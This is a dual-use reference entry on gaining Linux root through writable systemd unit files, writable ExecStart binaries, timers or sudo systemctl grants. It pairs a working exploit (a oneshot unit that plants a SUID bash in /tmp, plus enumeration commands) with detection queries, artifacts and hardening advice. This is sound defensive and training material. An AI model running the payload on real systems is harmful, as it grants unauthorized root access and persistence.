name: Writable systemd unit / relative ExecStart privesc
command: systemctl start <unit>   # root runs attacker ExecStart from a writable unit
description: systemd runs system services as root. If an unprivileged user can write a system-level .service or .timer unit file (world-writable unit, writable drop-in directory, or writable /etc/systemd/system), or if a unit's ExecStart points at a writable or relative binary path, the user sets ExecStart to their payload and starts/triggers the unit so systemd executes it as root. Also covers unit files reachable through a sudo systemctl grant.
notes:
=== WHAT IT IS ===
  System services run as root. Control over the unit file (or the binary it runs)
  means control over a root process. Three common openings:
    1. Writable unit file in /etc/systemd/system or /lib/systemd/system
    2. Writable binary referenced by ExecStart (or a relative/missing path)
    3. sudo systemctl ... granting start/enable of a unit you can influence

=== ENUMERATE ===
  # writable unit files:
  find /etc/systemd/system /lib/systemd/system /run/systemd/system -writable -name '*.service' -o -writable -name '*.timer' 2>/dev/null
  # writable ExecStart targets:
  systemctl list-units --type=service
  grep -r '^ExecStart=' /etc/systemd/system 2>/dev/null
  # can you sudo systemctl?
  sudo -l

=== WRITABLE UNIT -> ROOT ===
  cat > /etc/systemd/system/pwn.service <<'EOF'
  [Unit]
  Description=pwn
  [Service]
  Type=oneshot
  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
  [Install]
  WantedBy=multi-user.target
  EOF
  systemctl daemon-reload
  systemctl start pwn.service
  /tmp/rootbash -p          # uid=0

=== WRITABLE ExecStart BINARY ===
  # If ExecStart=/opt/app/run.sh and run.sh is writable, append your payload and
  # wait for (or trigger) the service restart.

=== WRITABLE .timer ===
  # A writable .timer with OnCalendar/OnBootSec starting a unit you control runs it as root on schedule.

=== ALTERNATIVES ===
  cron-abuse-pspy (cron-based); sudo-abuse (sudo systemctl)

examples.label: Drop a oneshot unit that makes a SUID bash
Reload, start, and use the SUID shell

recommended.note: Scheduler-based root execution via cron, same idea as a .timer.
A sudo systemctl grant is a common way in.
Pair with SUID enumeration when no writable unit exists.

defense.why_it_works: systemd starts system units as root from the service manager. If filesystem permissions let an unprivileged user modify a unit file, a drop-in, or the executable an ExecStart points to - or a sudo rule lets them control systemctl - they can make systemd run an attacker-chosen command with root privileges. A relative or unquoted ExecStart path can also be hijacked via a writable earlier directory.
defense.prerequisites: Write access to a system unit file / drop-in / its referenced binary, OR a sudo grant for systemctl start|enable|restart of an influenceable unit. daemon-reload (or a reboot/timer) to pick up changes.
defense.impact: Arbitrary command execution as root and persistence (an enabled unit survives reboot), from a single filesystem or sudoers misconfiguration.
defense.detection: [MITRE T1543.002] Creation or modification of files under /etc/systemd/system, /run/systemd/system or /lib/systemd/system by a non-root user; systemctl daemon-reload followed by start/enable of a new unit; root processes spawned by systemd whose ExecStart resides in a writable or non-standard path.
defense.artifacts: auditd watch hits on the systemd unit directories; journald records of a new/changed unit and its start; a unit with ExecStart in /tmp, /home or /opt writable paths; a SUID shell or reverse-shell child of systemd.
defense.splunk_spl:
index=linux sourcetype="linux:auditd" (name="/etc/systemd/system/*" OR name="/run/systemd/system/*") (syscall=open OR syscall=openat OR syscall=rename) a1="*O_WRONLY*"
| where auid!=0
| table _time, host, auid, exe, name
defense.elastic_kql: event.category:file and file.path:(\/etc\/systemd\/system\/* or \/run\/systemd\/system\/*) and not user.name:root
defense.sentinel_kql:
Syslog
| where SyslogMessage has "systemd" and SyslogMessage has_any ("/etc/systemd/system","daemon-reload","ExecStart")
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// non-root creating/modifying a system unit then starting it
defense.sigma_rules: lnx_systemd_unit_write_nonroot (non-root write to a system unit directory followed by start/enable)
defense.prevention: Ensure /etc/systemd/system, /lib/systemd/system and /run/systemd/system (and all unit files) are root-owned and not group/world-writable; use absolute, quoted ExecStart paths to root-owned binaries. Avoid sudo systemctl grants, or constrain them to specific read-only units. Audit unit directories with auditd and review on change.

detections.name: Non-root write to systemd unit directory then start
detections.logic:
Syslog
| where SyslogMessage has_any ("/etc/systemd/system","/run/systemd/system")
| where SyslogMessage has_any ("daemon-reload","systemctl start","systemctl enable","ExecStart")
| project TimeGenerated, Computer, SyslogMessage
detections.false_positives: Package managers and configuration management (apt, dnf, Ansible, Puppet) legitimately install and reload units, but run as root.
detections.tuning: Restrict to writes by a non-root auid; alert when the new unit's ExecStart points into a writable path.
